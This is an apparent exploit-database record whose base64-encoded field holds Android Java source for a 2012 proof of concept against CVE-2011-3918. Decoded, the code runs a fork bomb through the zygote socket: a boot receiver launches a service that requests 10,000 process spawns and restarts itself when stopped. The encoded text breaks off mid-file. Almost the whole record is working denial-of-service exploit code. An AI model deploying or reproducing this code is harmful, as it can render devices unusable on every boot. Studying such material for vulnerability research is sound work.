{
    "source": "exploit-database", 
    "exploit": "IyMjIyMjIyMjIyMjIyMjIyMgQm9vdFJlY2VpdmVyLmphdmEgIyMjIyMjIyMjIyMjIyMjIyMjDQoNCi8qKg0KICogQW5kcm9pZCBBcHBsaWNhdGlvbiB0aGF0IHBlcmZvcm1zIHRoZSBmb3JrIGJvbWIgYXR0YWNrIGh0dHA6Ly93ZWIubnZkLm5pc3QuZ292L3ZpZXcvdnVsbi9kZXRhaWw/dnVsbklkPUNWRS0yMDExLTM5MTgNCiAqDQogKiBGdXJ0aGVyIGluZm9ybWF0aW9ucyBjYW4gYmUgZm91bmQgYXQgaHR0cDovL3d3dy5haS1sYWIuaXQvYnVnQW5kcm9pZC9idWdBbmRyb2lkLmh0bWwNCiAqIA0KICogDQogKiBAYXV0aG9yIEx1Y2EgVmVyZGVyYW1lIDxsdWNhLnZlcmRlcmFtZUB1bmlnZS5pdD4NCiAqIEB2ZXJzaW9uIDEuMA0KICogDQogKiBDb3B5cmlnaHQgMjAxMiBMdWNhIFZlcmRlcmFtZQ0KICogDQogKiBUaGlzIGZpbGUgaXMgcGFydCBvZiBaeWdvdGVWdWxuZXJhYmlsaXR5Lg0KDQogICAgWnlnb3RlVnVsbmVyYWJpbGl0eSBpcyBmcmVlIHNvZnR3YXJlOiB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5DQogICAgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkNCiAgICB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcg0KICAgIChhdCB5b3VyIG9wdGlvbikgYW55IGxhdGVyIHZlcnNpb24uDQoNCiAgICBaeWdvdGVWdWxuZXJhYmlsaXR5IGlzIGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2VmdWwsDQogICAgYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YNCiAgICBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlDQogICAgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4NCg0KICAgIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlDQogICAgYWxvbmcgd2l0aCBaeWdvdGVWdWxuZXJhYmlsaXR5LiAgSWYgbm90LCBzZWUgPGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy8+Lg0KICogDQogKi8NCg0KDQoNCnBhY2thZ2UgaXQuYWlsYWI7DQoNCmltcG9ydCBhbmRyb2lkLmNvbnRlbnQuQnJvYWRjYXN0UmVjZWl2ZXI7DQppbXBvcnQgYW5kcm9pZC5jb250ZW50LkNvbnRleHQ7DQppbXBvcnQgYW5kcm9pZC5jb250ZW50LkludGVudDsNCmltcG9ydCBhbmRyb2lkLnV0aWwuTG9nOw0KIA0KcHVibGljIGNsYXNzIEJvb3RSZWNlaXZlciBleHRlbmRzIEJyb2FkY2FzdFJlY2VpdmVyew0KCQ0KICAgICAgICBAT3ZlcnJpZGUNCiAgICAgICAgcHVibGljIHZvaWQgb25SZWNlaXZlKENvbnRleHQgY29udGV4dCwgSW50ZW50IGludGVudCkgew0KICAgICAgICAJDQoJICAgICAgICAJTG9nLmQoIkJPT1QiLCJib290IGNvbXBsZXRlZC4gc3RhcnRpbmcgc2VydmljZSIpOw0KCSAgICAgICAgCUludGVudCBpbnRlbnRSZWNlaXZlciA9IG5ldyBJbnRlbnQoKTsNCgkgICAgICAgIAlpbnRlbnRSZWNlaXZlci5zZXRBY3Rpb24oIml0LmFpbGFiLlNlcnZpY2VET1MiKTsNCgkgICAgICAgICAgICBjb250ZXh0LnN0YXJ0U2VydmljZShpbnRlbnRSZWNlaXZlcik7DQogICAgICAgIH0NCn0NCg0KDQojIyMjIyMjIyMjIyMjIyMjIyBTZXJ2aWNlRE9TLmphdmEgIyMjIyMjIyMjIyMjIyMjIyMjDQoNCg0KLyoqDQogKiBBbmRyb2lkIEFwcGxpY2F0aW9uIHRoYXQgcGVyZm9ybXMgdGhlIGZvcmsgYm9tYiBhdHRhY2sgaHR0cDovL3dlYi5udmQubmlzdC5nb3Yvdmlldy92dWxuL2RldGFpbD92dWxuSWQ9Q1ZFLTIwMTEtMzkxOA0KICoNCiAqIEZ1cnRoZXIgaW5mb3JtYXRpb25zIGNhbiBiZSBmb3VuZCBhdCBodHRwOi8vd3d3LmFpLWxhYi5pdC9idWdBbmRyb2lkL2J1Z0FuZHJvaWQuaHRtbA0KICogDQogKiANCiAqIEBhdXRob3IgTHVjYSBWZXJkZXJhbWUgPGx1Y2EudmVyZGVyYW1lQHVuaWdlLml0Pg0KICogQHZlcnNpb24gMS4wDQogKiANCiAqIENvcHlyaWdodCAyMDEyIEx1Y2EgVmVyZGVyYW1lDQogKiANCiAqIFRoaXMgZmlsZSBpcyBwYXJ0IG9mIFp5Z290ZVZ1bG5lcmFiaWxpdHkuDQoNCiAgICBaeWdvdGVWdWxuZXJhYmlsaXR5IGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkNCiAgICBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQ0KICAgIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yDQogICAgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4NCg0KICAgIFp5Z290ZVZ1bG5lcmFiaWxpdHkgaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwNCiAgICBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZg0KICAgIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUNCiAgICBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLg0KDQogICAgWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UNCiAgICBhbG9uZyB3aXRoIFp5Z290ZVZ1bG5lcmFiaWxpdHkuICBJZiBub3QsIHNlZSA8aHR0cDovL3d3dy5nbnUub3JnL2xpY2Vuc2VzLz4uDQogKiANCiAqLw0KDQoNCnBhY2thZ2UgaXQuYWlsYWI7DQoNCg0KaW1wb3J0IGphdmEuaW8uQnVmZmVyZWRXcml0ZXI7DQppbXBvcnQgamF2YS5pby5EYXRhSW5wdXRTdHJlYW07DQppbXBvcnQgamF2YS5pby5JT0V4Y2VwdGlvbjsNCmltcG9ydCBqYXZhLmlvLlByaW50V3JpdGVyOw0KDQppbXBvcnQgYW5kcm9pZC5hcHAuU2VydmljZTsNCmltcG9ydCBhbmRyb2lkLmNvbnRlbnQuSW50ZW50Ow0KaW1wb3J0IGFuZHJvaWQubmV0LkxvY2FsU29ja2V0Ow0KaW1wb3J0IGFuZHJvaWQubmV0LkxvY2FsU29ja2V0QWRkcmVzczsNCmltcG9ydCBhbmRyb2lkLm9zLkhhbmRsZXJUaHJlYWQ7DQppbXBvcnQgYW5kcm9pZC5vcy5JQmluZGVyOw0KaW1wb3J0IGFuZHJvaWQudXRpbC5Mb2c7DQoNCnB1YmxpYyBjbGFzcyBTZXJ2aWNlRE9TIGV4dGVuZHMgU2VydmljZXsNCgkNCglTb2NrZXRVdGlsIHNvY2tldFV0aWwgPSBudWxsOw0KCQ0KCXB1YmxpYyBib29sZWFuIGNvbm5lY3RUb1p5Z290ZUlmTmVlZGVkKCl7DQoJCQ0KCQlpbnQgcmV0cnkgPSAwOw0KCQl3aGlsZSgoKHNvY2tldFV0aWwgPT0gbnVsbCkgfHwgKHNvY2tldFV0aWwuc1p5Z290ZVNvY2tldCA9PSBudWxsKSkgJiYgcmV0cnkgPCAyMCkNCgkJew0KCQkJTG9nLmQoIlNFUlYiLCAiY29ubmVjdGlvbiB0byBzb2NrZXQgbmVlZGVkIik7DQoJCQlzb2NrZXRVdGlsID0gbnVsbDsNCgkJCWlmIChyZXRyeSA+IDApIHsNCiAgICAgICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICAgIExvZy5kKCJTRVJWIiwgIlp5Z290ZSBub3QgdXAgeWV0LCBzbGVlcGluZy4uLiIpOw0KICAgICAgICAgICAgICAgICAgIFRocmVhZC5zbGVlcCg1MDApOw0KICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEludGVycnVwdGVkRXhjZXB0aW9uIGV4KSB7DQogICAgICAgICAgICAgICAgICAgLy8gc2hvdWxkIG5ldmVyIGhhcHBlbg0KICAgICAgICAgICAgICAgIH0NCgkJCX0NCgkJCS8vbG9hZGluZyBwYXJ0Li4NCgkJICAgIAkgICAgDQoJCSAgICBMb2NhbFNvY2tldCBjbGllbnQgPSBuZXcgTG9jYWxTb2NrZXQoKTsNCg0KICAgICAgICAgICAgdHJ5IHsNCgkJCQljbGllbnQuY29ubmVjdChuZXcgTG9jYWxTb2NrZXRBZGRyZXNzKCJ6eWdvdGUiLExvY2FsU29ja2V0QWRkcmVzcy5OYW1lc3BhY2UuUkVTRVJWRUQpKTsNCgkJCX0gY2F0Y2ggKElPRXhjZXB0aW9uIGUxKSB7DQoJCQkJLy8gVE9ETyBBdXRvLWdlbmVyYXRlZCBjYXRjaCBibG9jaw0KCQkJCUxvZy5lKCJTRVJWIiwibGluayBjbGllbnQgZXJyb3IiKTsNCgkJCQllMS5wcmludFN0YWNrVHJhY2UoKTsNCgkJCX0NCiAgICAgICAgICAgIA0KCQkJaWYoY2xpZW50ICE9IG51bGwpDQoJCQl7DQoJCQkJRGF0YUlucHV0U3RyZWFtIGluID0gbnVsbDsNCgkJCQl0cnkgew0KCQkJCQlpbiA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oY2xpZW50LmdldElucHV0U3RyZWFtKCkpOw0KCQkJCX0gY2F0Y2ggKElPRXhjZXB0aW9uIGUpIHsNCgkJCQkJLy8gVE9ETyBBdXRvLWdlbmVyYXRlZCBjYXRjaCBibG9jaw0KCQkJCQllLnByaW50U3RhY2tUcmFjZSgpOw0KCQkJCX0NCgkJCQlQcmludFdyaXRlciBwID0gbnVsbDsNCgkJCQl0cnkgew0KCQkJCQlwID0gbmV3IFByaW50V3JpdGVyKGNsaWVudC5nZXRPdXRwdXRTdHJlYW0oKSk7DQoJCQkJfSBjYXRjaCAoSU9FeGNlcHRpb24gZSkgew0KCQkJCQkvLyBUT0RPIEF1dG8tZ2VuZXJhdGVkIGNhdGNoIGJsb2NrDQoJCQkJCWUucHJpbnRTdGFja1RyYWNlKCk7DQoJCQkJfQ0KCQkJCUJ1ZmZlcmVkV3JpdGVyIG91dCA9IG5ldyBCdWZmZXJlZFdyaXRlcihwKTsNCgkJCQlzb2NrZXRVdGlsID0gbmV3IFNvY2tldFV0aWwoY2xpZW50LGluLG91dCk7DQoJCQkJTG9nLmQoIlNFUlYiLCAic29ja2V0IGNvbm5lY3Rpb24gY29tcGxldGVkIik7DQoJCQl9DQoJCQlyZXRyeSsrOw0KCQl9IC8vZmluZSB3aGlsZQ0KCQlpZihzb2NrZXRVdGlsICE9IG51bGwpDQoJCXsNCgkJCWlmKHJldHJ5ID4gMCkNCgkJCQlMb2cuZCgiU0VSViIsICJzb2NrZXQgY29ubmVjdGlvbiBjb21wbGV0ZWQiKTsNCgkJCXJldHVybiB0cnVlOw0KCQl9DQoJCXJldHVybiBmYWxzZTsNCgl9DQoJDQoJDQoJDQoJQE92ZXJyaWRlDQoJICBwdWJsaWMgdm9pZCBvbkNyZWF0ZSgpIHsNCgkgICAgLy8gU3RhcnQgdXAgdGhlIHRocmVhZCBydW5uaW5nIHRoZSBzZXJ2aWNlLiAgTm90ZSB0aGF0IHdlIGNyZWF0ZSBhDQoJICAgIC8vIHNlcGFyYXRlIHRocmVhZCBiZWNhdXNlIHRoZSBzZXJ2aWNlIG5vcm1hbGx5IHJ1bnMgaW4gdGhlIHByb2Nlc3Mncw0KCSAgICAvLyBtYWluIHRocmVhZCwgd2hpY2ggd2UgZG9uJ3Qgd2FudCB0byBibG9jay4gIFdlIGFsc28gbWFrZSBpdA0KCSAgICAvLyBiYWNrZ3JvdW5kIHByaW9yaXR5IHNvIENQVS1pbnRlbnNpdmUgd29yayB3aWxsIG5vdCBkaXNydXB0IG91ciBVSS4NCgkgICAgSGFuZGxlclRocmVhZCB0aHJlYWQgPSBuZXcgSGFuZGxlclRocmVhZCgiU2VydmljZURPUyIpOw0KCSAgICB0aHJlYWQuc3RhcnQoKTsJICAgIA0KCSAgICBjb25uZWN0VG9aeWdvdGVJZk5lZWRlZCgpOwkNCgkgIH0NCgkNCglAT3ZlcnJpZGUNCglwdWJsaWMgSUJpbmRlciBvbkJpbmQoSW50ZW50IGludGVudCkgew0KCQkvLyBUT0RPIEF1dG8tZ2VuZXJhdGVkIG1ldGhvZCBzdHViDQoJCW9uU3RhcnRDb21tYW5kKGludGVudCwwLDApOw0KCQlyZXR1cm4gbnVsbDsNCgl9DQoJDQoJQE92ZXJyaWRlDQoJICBwdWJsaWMgaW50IG9uU3RhcnRDb21tYW5kKEludGVudCBpbnRlbnQsIGludCBmbGFncywgaW50IHN0YXJ0SWQpIHsNCgkgICAgDQoJCUxvZy5kKCJTRVJWIiwib25TdGFydCIpOw0KCQlmaW5hbCBpbnQgdWlkID0gMTIzNDU2Ow0KCQlmaW5hbCBpbnQgZ2lkID0gMTIzNDU2Ow0KCQlmaW5hbCBpbnRbXSBnaWRzID0ge307DQoJCVN0cmluZ1tdIGV4dHJhQXJncyA9IG51bGw7IC8vYWx0cmltZW50aSBudWxsDQoNCgkJU3RyaW5nIGNsYXNzTmFtZSA9ICJjb20uYW5kcm9pZC5pbnRlcm5hbC51dGlsLldpdGhGcmFtZXdvcmsiOw0KCQkvL1N0cmluZyBjbGFzc05hbWUgPSAiYW5kcm9pZC5hcHAuQWN0aXZpdHlUaHJlYWQiOw0KCQkNCgkJaW50IHJlcyA9IDA7DQoJCWludCB0ciA9IDA7DQoJCXdoaWxlKHRyPDEwMDAwKQ0KCQl7DQoJCQkvL1N0cmluZyBuaWNlTmFtZSA9ICJEdW1teVByb2Nlc3MiICsgdHI7DQoJCQkNCgkJCWNvbm5lY3RUb1p5Z290ZUlmTmVlZGVkKCk7IA0KCQkJdHJ5IHsNCgkJCQlyZXMgPSBzb2NrZXRVdGlsLnN0YXJ0VmlhWnlnb3RlKGNsYXNzTmFtZSxudWxsLHVpZCxnaWQsZ2lkcywwLGV4dHJhQXJncyk7DQoJCQl9IGNhdGNoIChFeGNlcHRpb24gZSkgew0KCQkJCS8vIFRPRE8gQXV0by1nZW5lcmF0ZWQgY2F0Y2ggYmxvY2sNCgkJCQlMb2cuZSgiU0VSViIsICJzdGFydGluZyBlcnJvciIpOw0KCQkJCWUucHJpbnRTdGFja1RyYWNlKCk7DQoJCQl9DQoJCQkvL0xvZy5kKCJTRVJWIiwgInJpc3VsdGF0byBzdGFydFZpYVp5Z290ZTogIiArIHJlcyk7DQoJCQlMb2cuZCgiU0VSViIsICJzdGFydGVkIHByb2Nlc3MgIzoiICt0cik7DQoJCQl0cisrOw0KCQl9Ly9maW5lIHdoaWxlDQoJCQ0KCQkvL2lmIHdoZSByZXR1cm4gaGVyZSAtPiByZXN0YXJ0IQ0KCQlyZXR1cm4gU1RBUlRfU1RJQ0tZOw0KCSAgfQ0KCQ0KCUBPdmVycmlkZQ0KCXB1YmxpYyB2b2lkIG9uRGVzdHJveSAoKXsNCgkJc29ja2V0VXRpbC5jbGVhbigpOw0KCQlzb2NrZXRVdGlsID0gbnVsbDsNCgkJTG9nLmQoIlNFUlYiLCAic2VydmljZSBkZXN0cm95ZWQhIHRyeWluZyB0byByZXN0YXJ0Li4uIik7DQoJCUludGVudCBpbnRlbnQgPSBuZXcgSW50ZW50KHRoaXMsIFNlcnZpY2VET1MuY2xhc3MpOw0KCQlvblN0YXJ0Q29tbWFuZChpbnRlbnQsMCwwKTsNCgl9DQoNCn0NCg0KDQojIyMjIyMjIyMjIyMjIyMjIyBTb2NrZXRBbmRyb2lkQWN0aXZpdHkuamF2YSAjIyMjIyMjIyMjIyMjIyMjIyMNCg0KLyoqDQogKiBBbmRyb2lkIEFwcGxpY2F0aW9uIHRoYXQgcGVyZm9ybXMgdGhlIGZvcmsgYm9tYiBhdHRhY2sgaHR0cDovL3dlYi5udmQubmlzdC5nb3Yvdmlldy92dWxuL2RldGFpbD92dWxuSWQ9Q1ZFLTIwMTEtMzkxOA0KICoNCiAqIEZ1cnRoZXIgaW5mb3JtYXRpb25zIGNhbiBiZSBmb3VuZCBhdCBodHRwOi8vd3d3LmFpLWxhYi5pdC9idWdBbmRyb2lkL2J1Z0FuZHJvaWQuaHRtbA0KICogDQogKiANCiAqIEBhdXRob3IgTHVjYSBWZXJkZXJhbWUgPGx1Y2EudmVyZGVyYW1lQHVuaWdlLml0Pg0KICogQHZlcnNpb24gMS4wDQogKiANCiAqIENvcHlyaWdodCAyMDEyIEx1Y2EgVmVyZGVyYW1lDQogKiANCiAqIFRoaXMgZmlsZSBpcyBwYXJ0IG9mIFp5Z290ZVZ1bG5lcmFiaWxpdHkuDQoNCiAgICBaeWdvdGVWdWxuZXJhYmlsaXR5IGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkNCiAgICBpdCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzIHB1Ymxpc2hlZCBieQ0KICAgIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yDQogICAgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4NCg0KICAgIFp5Z290ZVZ1bG5lcmFiaWxpdHkgaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwNCiAgICBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZg0KICAgIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUNCiAgICBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLg0KDQogICAgWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UNCiAgICBhbG9uZyB3aXRoIFp5Z290ZVZ1bG5lcmFiaWxpdHkuICBJZiBub3QsIHNlZSA8aHR0cDovL3d3dy5nbnUub3JnL2xpY2Vuc2VzLz4uDQogKiANCiAqLw0KDQoNCnBhY2thZ2UgaXQuYWlsYWI7DQoNCg0KaW1wb3J0IGFuZHJvaWQuYXBwLkFjdGl2aXR5Ow0KaW1wb3J0IGFuZHJvaWQuY29udGVudC5JbnRlbnQ7DQppbXBvcnQgYW5kcm9pZC5vcy5CdW5kbGU7DQppbXBvcnQgYW5kcm9pZC51dGlsLkxvZzsNCg0KcHVibGljIGNsYXNzIFNvY2tldEFuZHJvaWRBY3Rpdml0eSBleHRlbmRzIEFjdGl2aXR5IHsNCiAgICAvKiogQ2FsbGVkIHdoZW4gdGhlIGFjdGl2aXR5IGlzIGZpcnN0IGNyZWF0ZWQuICovDQogICAgQE92ZXJyaWRlDQogICAgcHVibGljIHZvaWQgb25DcmVhdGUoQnVuZGxlIHNhdmVkSW5zdGFuY2VTdGF0ZSkgew0KICAgICAgICBzdXBlci5vbkNyZWF0ZShzYXZlZEluc3RhbmNlU3RhdGUpOw0KDQogICAgICAgIExvZy5kKCJBUFAiLCJzdGFydGluZyBvZiB0aGUgc2VydmljZSIpOw0KICAgICAgICBJbnRlbnQgaW50ZW50ID0gbmV3IEludGVudCh0aGlzLCBTZXJ2aWNlRE9TLmNsYXNzKTsNCiAgICAgICAgc3RhcnRTZXJ2aWNlKGludGVudCk7DQogICAgICAgIExvZy5kKCJBUFAiLCJzZXJ2aWNlIGFjdGl2YXRlZCIpOw0KICAgICAgICB0aGlzLmZpbmlzaCgpOw0KCQkNCiAgICB9DQp9DQoNCg0KIyMjIyMjIyMjIyMjIyMjIyMgU29ja2V0VXRpbC5qYXZhICMjIyMjIyMjIyMjIyMjIyMjIw0KDQoNCi8qKg0KICogQW5kcm9pZCBBcHBsaWNhdGlvbiB0aGF0IHBlcmZvcm1zIHRoZSBmb3JrIGJvbWIgYXR0YWNrIGh0dHA6Ly93ZWIubnZkLm5pc3QuZ292L3ZpZXcvdnVsbi9kZXRhaWw/dnVsbklkPUNWRS0yMDExLTM5MTgNCiAqDQogKiBGdXJ0aGVyIGluZm9ybWF0aW9ucyBjYW4gYmUgZm91bmQgYXQgaHR0cDovL3d3dy5haS1sYWIuaXQvYnVnQW5kcm9pZC9idWdBbmRyb2lkLmh0bWwNCiAqIA0KICogDQogKiBAYXV0aG9yIEx1Y2EgVmVyZGVyYW1lIDxsdWNhLnZlcmRlcmFtZUB1bmlnZS5pdD4NCiAqIEB2ZXJzaW9uIDEuMA0KICogDQogKiBDb3B5cmlnaHQgMjAxMiBMdWNhIFZlcmRlcmFtZQ0KICogDQogKiBUaGlzIGZpbGUgaXMgcGFydCBvZiBaeWdvdGVWdWxuZXJhYmlsaXR5Lg0KDQogICAgWnlnb3RlVnVsbmVyYWJpbGl0eSBpcyBmcmVlIHNvZnR3YXJlOiB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5DQogICAgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkNCiAgICB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZSBMaWNlbnNlLCBvcg0KICAgIChhdCB5b3VyIG9wdGlvbikgYW55IGxhdGVyIHZlcnNpb24uDQoNCiAgICBaeWdvdGVWdWxuZXJhYmlsaXR5IGlzIGRpc3RyaWJ1dGVkIGluIHRoZSBob3BlIHRoYXQgaXQgd2lsbCBiZSB1c2VmdWwsDQogICAgYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YNCiAgICBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlDQogICAgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgZm9yIG1vcmUgZGV0YWlscy4NCg0KICAgIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlDQogICAgYWxvbmcgd2l0aCBaeWdvdGVWdWxuZXJhYmlsaXR5LiAgSWYgbm90LCBzZWUgPGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy8+Lg0KICogDQogKi8NCg0KcGFja2FnZSBpdC5haWxhYjsNCg0KaW1wb3J0IGphdmEuaW8uQnVmZmVyZWRXcml0ZXI7DQppbXBvcnQgamF2YS5pby5EYXRhSW5wdXRTdHJlYW07DQppbXBvcnQgamF2YS5pby5JT0V4Y2VwdGlvbjsNCmltcG9ydCBqYXZhLnV0aWwuQXJyYXlMaXN0Ow0KDQppbXBvcnQgYW5kcm9pZC5uZXQuTG9jYWxTb2NrZXQ7DQoNCnB1YmxpYyBjbGFzcyBTb2NrZXRVdGlsIHsNCgkNCglzdGF0aWMgTG9jYWxTb2NrZXQgc1p5Z290ZVNvY2tldCA9IG51bGw7DQoJc3RhdGljIERhdGFJbnB1dFN0cmVhbSBzWnlnb3RlSW5wdXRTdHJlYW0gPSBudWxsOw0KCXN0YXRpYyBCdWZmZXJlZFdyaXRlciBzWnlnb3RlV3JpdGVyID0gbnVsbDsNCgkNCgkvKiB2ZXJzaW9uZSB1bml4RG9tYWluU29ja2V0DQoJc3RhdGljIFVuaXhEb21haW5Tb2NrZXRDbGllbnQgc1p5Z290ZVNvY2tldCA9IG51bGw7DQoJcHVibGljIFNvY2tldFV0aWwoVW5peERvbWFpblNvY2tldENsaWVudCBjLCBEYXRhSW5wdXRTdHJlYW0gaSxCdWZmZXJlZFdyaXRlciBvKQ0KCXsNCgkJc1p5Z290ZVNvY2tldCA9IGM7DQoJCXNaeWdvdGVJbnB1dFN0cmVhbSA9IGk7DQoJCXNaeWdvdGVXcml0ZXIgPSBvOw0KCX0NCgkqLw0KCQ0KCXB1YmxpYyB2b2lkIGNsZWFuKCkNCgl7DQoJCXRyeSB7DQoJCQlzWnlnb3RlU29ja2V0LmNsb3NlKCk7DQoJCQlzWnlnb3RlSW5wdXRTdHJlYW0uY2xvc2UoKTsNCgkJCXNaeWdvdGVXcml0ZXIuY2xvc2UoKTsNCgkJfSBjYXRjaCAoSU9FeGNlcHRpb24gZSkgew0KCQkJLy8gVE9ETyBBdXRvLWdlbmVyYXRlZCBjYXRjaCBibG9jaw0KCQkJZS5wcmludFN0YWNrVHJhY2UoKTsNCgkJfQ0KCQlzWnlnb3RlU29ja2V0ID0gbnVsbDsNCgkJc1p5Z290ZVdyaXRlciA9IG51bGw7DQoJCXNaeWdvdGVJbnB1dFN0cmVhbSA9IG51bGw7DQoJfQ0KCQ0KCXB1YmxpYyBTb2NrZXRVdGlsKExvY2FsU29ja2V0IGMsIERhdGFJbnB1dFN0cmVhbSBpLEJ1ZmZlcmVkV3JpdGVyIG8pDQoJew0KCQlzWnlnb3RlU29ja2V0ID0gYzsNCgkJc1p5Z290ZUlucHV0U3RyZWFtID0gaTsNCgkJc1p5Z290ZVdyaXRlciA9IG87DQoJfQ0KCQ0KCS8qDQoJICogU3RhcnRzIGEgbmV3IHByb2Nlc3MgdmlhIHRoZSB6eWdvdGUgbWVjaGFuaXNtLg0KCVBhcmFtZXRlcnM6DQoJcHJvY2Vzc0NsYXNzIENsYXNzIG5hbWUgd2hvc2Ugc3RhdGljIG1haW4oKSB0byBydW4NCgluaWNlTmFtZSAnbmljZScgcHJvY2VzcyBuYW1lIHRvIGFwcGVhciBpbiBwcw0KCXVpZCBhIFBPU0lYIHVpZCB0aGF0IHRoZSBuZXcgcHJvY2VzcyBzaG91bGQgc2V0dWlkKCkgdG8NCglnaWQgYSBQT1NJWCBnaWQgdGhhdCB0aGUgbmV3IHByb2Nlc3Mgc2h1b2xkIHNldGdpZCgpIHRvDQoJZ2lkcyBudWxsLW9rOyBhIGxpc3Qgb2Ygc3VwcGxlbWVudGFyeSBncm91cCBJRHMgdGhhdCB0aGUgbmV3IHByb2Nlc3Mgc2hvdWxkIHNldGdyb3VwKCkgdG8uDQoJZW5hYmxlRGVidWdnZXIgVHJ1ZSBpZiBkZWJ1Z2dpbmcgc2hvdWxkIGJlIGVuYWJsZWQgZm9yIHRoaXMgcHJvY2Vzcy4NCglleHRyYUFyZ3MgQWRkaXRpb25hbCBhcmd1bWVudHMgdG8gc3VwcGx5IHRvIHRoZSB6eWdvdGUgcHJvY2Vzcy4NCglSZXR1cm5zOg0KCVBJRA0KCVRocm93czoNCglFeGNlcHRpb24gaWYgcHJvY2VzcyBzdGFydCBmYWlsZWQgZm9yIGFueSByZWFzb24NCgkgKi8NCgkNCglwdWJsaWMgaW50IHN0YXJ0VmlhWnlnb3RlKGZpbmFsIFN0cmluZyBwcm9jZXNzQ2xhc3MsDQoJCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgU3RyaW5nIG5pY2VOYW1lLA0KCQkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbmFsIGludCB1aWQsIGZpbmFsIGludCBnaWQsDQoJCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgaW50W10gZ2lkcywNCgkJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgZGVidWdGbGFncywNCgkJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmdbXSBleHRyYUFyZ3MpDQoJCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3dzIEV4Y2VwdGlvbiB7DQoJCQkgICAgICAgIGludCBwaWQ7DQoJCQkNCgkJCSAgICAgICAgc3luY2hyb25pemVkKFByb2Nlc3MuY2xh